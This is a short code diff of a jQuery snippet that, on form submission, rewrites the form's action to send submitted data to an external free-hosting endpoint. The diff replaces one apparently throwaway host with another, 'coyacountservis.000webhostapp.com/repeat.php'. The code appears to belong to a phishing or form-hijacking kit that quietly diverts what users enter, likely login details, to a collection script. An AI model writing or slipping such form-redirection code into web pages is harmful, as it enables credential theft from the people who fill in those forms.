@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://akjsdahsajshajhdk.000webhostapp.com/repeat.php");
+  $(myform).attr("action", "https://coyacountservis.000webhostapp.com/repeat.php");
 });
